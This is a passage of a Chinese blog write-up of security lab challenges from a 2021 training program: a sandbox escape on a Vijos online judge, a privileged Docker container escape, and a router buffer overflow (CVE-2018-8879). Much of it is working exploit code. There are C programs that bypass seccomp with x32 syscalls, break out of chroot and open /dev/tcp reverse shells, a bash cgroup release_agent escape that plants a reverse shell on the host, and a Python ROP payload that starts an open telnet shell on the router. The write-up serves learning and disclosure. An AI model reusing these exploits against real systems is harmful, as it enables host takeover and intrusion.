0&gt;&amp;1&#x27;&quot;</span>]</span><br></pre></td></tr></table></figure><p>通过在Vijos账号中创建自己的域并创建自己的题目，上传修改yaml文件后的测试文件压缩包，随意运行程序即可反弹Shell。拿到Docker下的root权限。</p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210813144701111.png" data-caption="image-20210813144701111"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210813144701111.png" alt="image-20210813144701111"></a></p><h2 id="Vijos-OJ评测机之沙箱逃逸"><a href="#Vijos-OJ评测机之沙箱逃逸" class="headerlink" title="Vijos OJ评测机之沙箱逃逸"></a>Vijos OJ评测机之沙箱逃逸</h2><p>题目背景：经过上次的Vijos逃逸事件之后，不懂安全的开发者修补了上次漏洞。并痛定思痛决定开始学习安全技术。在学习了安全技术之后，他认为VIJOS的沙箱允许选手在提交的代码中执行任意的系统调用是非常危险的行为，所以他决定对其进行限制，然而，在这个过程中，他又犯了一些错误，这些错误可以导致评测机被攻陷，你能找到这些错误，并利用它们攻陷评测机吗？</p><p>代码审计：同样的，使用 <code>git stutus</code> 和 <code>git diff</code> 查看相关代码更改。（不过开发者好像并没有修复第一个漏洞嘿嘿）主要更改就是重写了原有的沙箱机制，使用 <code>chroot </code>和 <code>LD_PRELOAD </code>指定 <code>scf.so</code> 文件制定沙箱</p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819123040774.png" data-caption="image-20210819123040774"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819123040774.png" alt="image-20210819123040774"></a></p><p>漏洞详情：评测机使用的沙箱依然是建立在docker容器中，在 <code>/tmp</code> 目录下创建沙箱使用的文件夹，并使用 <code>chroot</code> 使每一个沙箱都具有和评测机容器内一样的环境（只不过是假的root）。新引用的 <code>scf.so</code> 文件重写了所提交代码的 <code>main</code> 函数，通过 <code>LD_PRELOAD</code> 强行绑定 <code>seccomp</code> 组件限制程序使用不当的系统调用（syscall），例如直接写入文档或者执行恶意代码。</p><blockquote><p>  A <strong>chroot</strong> on Unix operating systems is an operation that changes the apparent root directory for the current running process and its children. A program that is run in such a modified environment cannot name (and therefore normally cannot access) files outside the designated directory tree. The term “chroot” may refer to the chroot(2) system call or the chroot(8) wrapper program. The modified environment is called a chroot jail.</p><p>  <strong>seccomp</strong> (short for <strong>secure computing mode</strong>) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a “secure” state where it cannot make any system call except <code>exit()</code>, <code>sigreturn()</code>, <code>read()</code> and <code>write()</code> to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS。 In this sense, it does not virtualize the system’s resources but isolates the process from them entirely.</p></blockquote><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819133532124.png" data-caption="image-20210819133532124"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819133532124.png" alt="image-20210819133532124"></a></p><p>通过IDA逆向所引用的 <code>scf.so</code> 文件，其只禁用了x86和x64下的系统调用，并未检查 x32 ABI的系统调用，因此使用x32的系统调用即可绕过 <code>sccomp</code> 的检测。因此，所有参数传参（例如所执行的命令，变量等），地址都需要手动指定为32位地址。</p><blockquote><p>  x32 is a new ABI being actively worked on. It is basically 32-bit code running in x86_64 (x64) mode on the CPU so that it has access to the additional 8 registers to boost program speed while remaining memory efficient via the use of 32-bit pointers. See <a href="https://sites.google.com/site/x32abi/">sites.google.com&#x2F;site&#x2F;x32abi</a> and <a href="http://lwn.net/Articles/456731/">lwn.net&#x2F;Articles&#x2F;456731</a>. – <a href="https://stackoverflow.com/users/1163142/gps">gps</a></p></blockquote><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819124847550.png" data-caption="image-20210819124847550"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819124847550.png" alt="image-20210819124847550"></a></p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819124754861.png" data-caption="image-20210819124754861"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819124754861.png" alt="image-20210819124754861"></a></p><p>逃逸 <code>chroot</code> 则相对来讲比较简单，在沙箱内得到RCE (Remote Code Execution) 权限后，向当前沙箱根目录下创建任意临时文件夹 <code>abc</code>，进入此文件夹下执行 <code>chroot</code> 命令，此时 <code>abc</code> 文件夹变成了根目录。然后多次执行更改当前工作目录为上级文件夹直到到达真正的根目录。此时再次执行 <code>chroot</code> 命令，则当前目录为容器根目录。</p><blockquote><ul><li><p>Create a temporary directory in its current working directory</p></li><li><p>Open the current working directory</p><p>​Note: only required if chroot() changes the calling program’s working directory.</p></li><li><p>Change the root directory of the process to the temporary directory using chroot().</p></li><li><p>Use fchdir() with the file descriptor of the opened directory to move the current working directory outside the chroot()ed area.</p><p>​Note: only required if chroot() changes the calling program’s working directory.</p></li><li><pre><code>Perform chdir(&quot;..&quot;) calls many times to move the current working directory into the real root directory.</code></pre><ul><li><pre><code>Change the root directory of the process to the current working directory, the real root directory, using chroot(&quot;.&quot;)</code></pre></li></ul></li></ul></blockquote><p>则最终攻击思路为：先绕过 <code>sccomp</code> 并跳出 <code>chroot</code> 在容器中通过执行任意代码删除所引用的 <code>/lib64/scf.so</code> 文件解除 <code>seccomp</code> 的syscall限制，再次上传第二段代码直接执行反弹shell指令，拿到容器shell。</p><p>EXP文件如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// first time code</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_root</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  mkdir(<span class="string">&quot;abc&quot;</span>, <span class="number">0755</span>);</span><br><span class="line">  syscall((<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">1073741985</span>, (<span class="type">unsigned</span> <span class="type">long</span>)<span class="string">&quot;abc&quot;</span>); <span class="comment">// chroot</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">  syscall((<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">1073741985</span>, (<span class="type">unsigned</span> <span class="type">long</span>)<span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chroot\n&quot;</span>);</span><br><span class="line">        <span class="comment">// syscall((unsigned)1073741985, (unsigned)&quot;.foo&quot;);</span></span><br><span class="line">        change_root();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> pagesize=getpagesize();</span><br><span class="line">        <span class="type">void</span> *region = mmap((<span class="type">void</span>*)<span class="number">0</span>,pagesize,PROT_READ|PROT_WRITE|PROT_EXEC,<span class="number">32</span>|MAP_PRIVATE|<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> comm[]= <span class="string">&quot;/bin/rm\0-rf\0/lib64/scf.so&quot;</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(region, comm, <span class="keyword">sizeof</span> comm);</span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> ptr[] = &#123;region, region+<span class="number">8</span>, region+<span class="number">12</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="built_in">memcpy</span>(region + <span class="number">64</span>, ptr, <span class="keyword">sizeof</span> ptr);</span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span>* ptr1 = region + <span class="number">64</span>;</span><br><span class="line">        syscall((<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">1073742344</span>, (<span class="type">unsigned</span> <span class="type">long</span>)ptr1[<span class="number">0</span>], (<span class="type">unsigned</span> <span class="type">long</span>)ptr1, <span class="number">0</span>); <span class="comment">// execve</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line"><span class="comment">// second time code</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_root</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  mkdir(<span class="string">&quot;abc&quot;</span>, <span class="number">0755</span>);</span><br><span class="line">  syscall((<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">1073741985</span>, (<span class="type">unsigned</span> <span class="type">long</span>)<span class="string">&quot;abc&quot;</span>); <span class="comment">// chroot</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">  syscall((<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">1073741985</span>, (<span class="type">unsigned</span> <span class="type">long</span>)<span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  change_root();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Running ps with system\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash -c \&quot;/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ps Done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在提交窗口依次运行payload代码即可获取反弹shell。ps：可能由于demo中对于代码执行时间有所限制，直接利用EXP可能会造成反弹shell时间非常短（只有不到1s），可以通过自定义题目代码执行时间等等方法去绕过，这里不过多赘述。</p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819130843286.png" data-caption="image-20210819130843286"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210819130843286.png" alt="image-20210819130843286"></a></p><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>挑战背景：即使我们通过前两个挑战得到了反弹shell，但是通过观察主机名我们可以发现实际上这个shell是docker内部的。我们还需要逃逸出docker才能得到主机的shell。</p><p>漏洞分析：因为评测机需要进行一些Linux内核的cgroup优化评测过程（例如直接限制运行时间和内存），因此允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限。所以攻击思路为：利用mount命令在Linux系统盘下挂载一个新建的文件夹使容器内可以直接访问主机文件，创建 <code>release_agent</code> 文件并通过创建子cgroup得以快速杀死cgroup内所有进程并触发 <code>release_agent</code> ，把攻击代码写入 <code>release_agent</code> 文件内即可。</p><blockquote><p>  使用特权模式启动容器后（docker run –privileged），Docker容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限、并可以执行mount命令进行挂载。</p><p>  当控制使用特权模式的容器时，Docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p></blockquote><blockquote><p>  cgroups(Control Groups) 是 linux 内核提供的一种机制，<strong>这种机制可以根据需求把一系列系统任务及其子任务整合(或分隔)到按资源划分等级的不同组内，从而为系统资源管理提供一个统一的框架</strong>。简单说，cgroups 可以限制、记录任务组所使用的物理资源。本质上来说，cgroups 是内核附加在程序上的一系列钩子(hook)，通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的。</p></blockquote><p><code>payload.sh</code> EXP文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/hola</span><br><span class="line">mount /dev/vda2 /mnt/hola</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; <span class="built_in">mkdir</span> /tmp/cgrp/x</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&quot;</span> &gt;&gt; /cmd</span><br><span class="line"><span class="built_in">chmod</span> a+x /cmd</span><br><span class="line"></span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br></pre></td></tr></table></figure><p>反弹shell：</p><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210813182738384.png" data-caption="image-20210813182738384"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/image-20210813182738384.png" alt="image-20210813182738384"></a></p><h2 id="安卓Chrome漏洞导致文件泄露"><a href="#安卓Chrome漏洞导致文件泄露" class="headerlink" title="安卓Chrome漏洞导致文件泄露"></a>安卓Chrome漏洞导致文件泄露</h2><p>暂未完成任务</p><h2 id="路由器未授权用户Getshell"><a href="#路由器未授权用户Getshell" class="headerlink" title="路由器未授权用户Getshell"></a>路由器未授权用户Getshell</h2><p>挑战背景：导师怕我们题目做的太快作为补充题目（bushi。路由器作为家庭网络的中枢，在网络安全中有至关重要的作用。若路由器被攻击者侵入，家庭网络上的所有流量都将暴露给攻击者。懒惰的开发者家里现在使用了一个旧版本固件的路由器，已知暴露在<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8879">CVE-2018-8879缓冲区溢出漏洞</a>的风险下，你能试着拿到他的高端路由器吗？（物理意义上以及安全意义上）</p><p>漏洞分析：根据文章，通过遍历web-server中所有文件查看是否能够找到未授权即可访问的页面，发现在 <code>blocking.asp</code> 页面中显示的信息都是通过URL参数传参得到的，<code>mac</code>，<code>flag</code> 和 <code>cat_id</code>。当通过往参数塞大量A时，通过系统日志，HTTPd 保护进程崩溃了。至此判断为非常经典的缓冲区溢出漏洞。但是只通过这个方式没有办法监听栈地址；并且无法跳转到shell code中；没有ROP chain，因为需要 <code>null-byte</code> 。（注意，目前为止的利用仅仅在URL参数中）通过查看栈内其他数据，发现在 HTTP 请求头中每个参数的结尾处有 <code>null-byte</code> 的存在，可以作为ROP chain使用。</p><blockquote><p>  ROP (Return Oriented Programming) is related to buffer overflows, in that it requires a buffer to overflow. The difference is that ROP is used to bypass certain protection measures that prevent normal buffer overflows. It turns out that a lot of the time, memory in programs is marked as non-executable. This means that we can’t just put shellcode on the stack and have it execute, this is where ROP comes in. <strong>Recall the stack.</strong> </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ return address ] &lt;-- this is the address of the next function to call, we want to overwrite this</span><br><span class="line">[  eip (address) ] &lt;-- this takes up memory</span><br><span class="line">[ stack variable ] &lt;-- this also takes up memory</span><br><span class="line">[    buffer[15]  ] &lt;-- this is the 16th character of our input string</span><br><span class="line">[      ...       ]</span><br><span class="line">[    buffer[0]   ] &lt;-- our input starts here</span><br></pre></td></tr></table></figure></blockquote><p>路由器为ARM架构，因此需提前了解ARM寄存器和其函数调用约定。</p><blockquote><p>  先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 <strong>r0 ～ r3</strong> 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 <strong>r0</strong> 中</p><p>  除此之外，arm 的 <strong>b&#x2F;bl</strong> 等指令实现跳转; <strong>pc</strong> 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标</p></blockquote><p><a data-fancybox="gallery" data-src="/2021/08/19/Tencent-Spark-Program-2021/assets/ARM_Calling_Convention.png" data-caption="img"><img src="/2021/08/19/Tencent-Spark-Program-2021/assets/ARM_Calling_Convention.png" alt="img"></a></p><p>需要执行恶意代码，首先我们需要控制的就是PC或b&#x2F;bl，能够有机会让我们控制的地方我们称之为 <code>gadget</code> 。寻找 gadget 的方式有很多，比如利用ROPgadget，ropper，甚至直接IDA逆向后搜索关键词。找到了合适的gadget，通过栈溢出，我们把URL参数flag溢出到存放请求头参数的区域，再通过请求头中参数使PC的地址成为任意我们所控制的地址。下一步便是寻找和系统调用相关的程序地址，比如system函数。把PC地址指向system函数的地址，再传参恶意代码，整个攻击过程就结束啦。</p><p><code>payload.py</code> EXP文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> struct, urllib3</span><br><span class="line"><span class="comment"># 00019360 add sp, sp #0x800 pop &#123;r4-r7,PC&#125;</span></span><br><span class="line"><span class="comment"># 0002B3B4 mov r0, sp; mov r5, sp; bl system</span></span><br><span class="line">cmd = <span class="string">&#x27;telnetd -p 8888 -b 0.0.0.0:8888 -l /bin/sh&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;;&#x27;</span> + cmd + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">align = <span class="string">&quot;A&quot;</span> * <span class="number">208</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">532</span></span><br><span class="line">payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x00019360</span>)</span><br><span class="line">url = <span class="string">&quot;http://192.168.50.1/blocking.asp&quot;</span></span><br><span class="line">params = &#123;<span class="string">&#x27;flag&#x27;</span>: payload&#125;</span><br><span class="line">headers = &#123;<span class="string">&#x27;Accept&#x27;</span>:(<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;&#x27;</span><span class="string">&#x27;q=0.9,image/webp,*/*;q=0.8&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: align + <span class="string">&quot;VVVV&quot;</span> + <span class="string">&quot;WWWW&quot;</span> + <span class="string">&quot;XXXX&quot;</span> + <span class="string">&quot;YYYY&quot;</span> + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x0002B3B4</span>),</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: cmd + <span class="string">&#x27;clickedItem_tab=0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">http = urllib3.PoolManager()</span><br><span class="line">r = http.request(<span class="string">&#x27;GET&#x27;</span>, url, fields=params,headers=headers,)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Project Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark Program </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
